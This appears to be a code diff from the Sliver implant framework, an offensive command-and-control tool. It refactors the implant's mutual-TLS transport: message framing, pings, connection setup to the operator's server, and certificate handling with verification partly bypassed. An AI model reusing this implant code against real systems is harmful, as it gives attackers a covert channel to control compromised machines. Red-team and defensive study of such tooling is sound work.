@@ -1,4 +1,4 @@
-package transports
+package mtls
 
 /*
 	Sliver Implant Framework
@@ -26,6 +26,7 @@ import (
 	"crypto/x509"
 	"encoding/binary"
 	"fmt"
+	"time"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -33,15 +34,22 @@ import (
 
 	"os"
 
+	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
-
 	"google.golang.org/protobuf/proto"
 )
 
-// socketWriteEnvelope - Writes a message to the TLS socket using length prefix framing
+var (
+	PingInterval = 30 * time.Second
+	readBufSize  = 16 * 1024 // 16kb
+	keyPEM       = `{{.Config.Key}}`
+	certPEM      = `{{.Config.Cert}}`
+)
+
+// WriteEnvelope - Writes a message to the TLS socket using length prefix framing
 // which is a fancy way of saying we write the length of the message then the message
 // e.g. [uint32 length|message] so the receiver can delimit messages properly
-func socketWriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
+func WriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -56,7 +64,7 @@ func socketWriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
 	return nil
 }
 
-func socketWritePing(connection *tls.Conn) error {
+func WritePing(connection *tls.Conn) error {
 	// {{if .Config.Debug}}
 	log.Print("Socket ping")
 	// {{end}}
@@ -67,11 +75,11 @@ func socketWritePing(connection *tls.Conn) error {
 		Type: pb.MsgPing,
 		Data: pingBuf,
 	}
-	return socketWriteEnvelope(connection, &envelope)
+	return WriteEnvelope(connection, &envelope)
 }
 
-// socketReadEnvelope - Reads a message from the TLS connection using length prefix framing
-func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
+// ReadEnvelope - Reads a message from the TLS connection using length prefix framing
+func ReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4) // Size of uint32
 	if len(dataLengthBuf) == 0 || connection == nil {
 		panic("[[GenerateCanary]]")
@@ -109,7 +117,7 @@ func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
 	err = proto.Unmarshal(dataBuf, envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Unmarshaling envelope error: %v", err)
+		log.Printf("Unmarshal envelope error: %v", err)
 		// {{end}}
 		return nil, err
 	}
@@ -117,8 +125,8 @@ func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
 	return envelope, nil
 }
 
-// tlsConnect - Get a TLS connection or die trying
-func tlsConnect(address string, port uint16) (*tls.Conn, error) {
+// MtlsConnect - Get a TLS connection or die trying
+func MtlsConnect(address string, port uint16) (*tls.Conn, error) {
 	tlsConfig := getTLSConfig()
 	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
 	if err != nil {
@@ -142,14 +150,14 @@ func getTLSConfig() *tls.Config {
 
 	// Load CA cert
 	caCertPool := x509.NewCertPool()
-	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))
+	caCertPool.AppendCertsFromPEM([]byte(cryptography.CACertPEM))
 
 	// Setup config with custom certificate validation routine
 	tlsConfig := &tls.Config{
 		Certificates:          []tls.Certificate{certPEM},
 		RootCAs:               caCertPool,
 		InsecureSkipVerify:    true, // Don't worry I sorta know what I'm doing
-		VerifyPeerCertificate: rootOnlyVerifyCertificate,
+		VerifyPeerCertificate: cryptography.RootOnlyVerifyCertificate,
 	}
 
 	return tlsConfig
